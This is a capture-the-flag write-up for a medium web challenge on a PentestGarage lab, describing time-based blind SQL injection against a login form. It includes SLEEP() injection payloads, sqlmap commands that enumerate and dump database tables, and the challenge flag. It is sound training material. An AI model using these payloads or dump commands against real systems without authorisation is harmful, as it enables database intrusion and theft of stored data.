# Blind SQLi — PentestGarage CTF

**Category:** Web Security
**Difficulty:** Medium
**Points:** 200
**Target:** `ctf-akshay-blind-sqli-ff1bdafd.challenges.pentestgarage.com`

## Summary

A login form (`POST /index.php`, fields `username`, `password`, `login`) is vulnerable to
**time-based blind SQL injection** on the `username` parameter. The application never
reflects query results or DB errors in its response — every response is byte-identical
(1392 bytes) regardless of input — so the only observable signal is **response timing**,
made possible via injected `SLEEP()` calls.

## Recon

Initial `curl` probing of the login form:

```bash
curl -s -X POST http://<target>/index.php \
  -d "username=test&password=test&login=Login" -o baseline.html
wc -c baseline.html
# 1392 bytes
```

Boolean payloads (`' AND '1'='1` vs `' AND '1'='2`) produced **identical** responses in
both content and size — ruling out classic boolean-based blind SQLi as an observable
oracle.

## Confirming the Injection

A time-based payload confirmed the injection point:

```bash
time curl -s -X POST http://<target>/index.php \
  -d "username=admin' AND SLEEP(3)-- -&password=x&login=Login" -o /dev/null
# real 3.33s   <-- confirms injectable + MySQL backend
```

Baseline (`SLEEP(0)`) returned in ~0.3s, confirming the delay was caused by the payload,
not network jitter.

## Exploitation with sqlmap

Since the injection point and technique were already confirmed manually, `sqlmap` was
used to automate enumeration and extraction:

```bash
sqlmap -u "http://<target>/index.php" \
  --data="username=admin&password=x&login=Login" \
  -p username --dbms=mysql --technique=T --batch
```

**Result:** confirmed time-based blind SQLi (MariaDB/MySQL backend) via:

```
username=admin' AND (SELECT 3394 FROM (SELECT(SLEEP(5)))moHf) AND 'UVmi'='UVmi
```

### Enumeration steps

```bash
# List databases
sqlmap ... -p username --dbms=mysql --technique=T --batch --dbs
# -> information_schema, vulnapp

# List tables
sqlmap ... -p username --dbms=mysql --technique=T --batch -D vulnapp --tables
# -> flag, users

# List columns
sqlmap ... -p username --dbms=mysql --technique=T --batch -D vulnapp -T flag --columns
# -> flag (varchar(200))

# Dump data
sqlmap ... -p username --dbms=mysql --technique=T --batch -D vulnapp -T flag --dump
```

## Flag

```
ctf{inject!ng_bl!nd}
```

## Key Takeaways

- Not all blind SQLi is boolean-based — when response content/size never changes,
  test for **time-based** injection before giving up.
- `sqlmap`'s `--technique=T` flag restricts testing to time-based blind, speeding up
  detection significantly when you already know the oracle type.
- Reusing sqlmap's session cache (`resumed the following injection point(s) from
  stored session`) avoids re-running the expensive detection phase on each follow-up
  command.
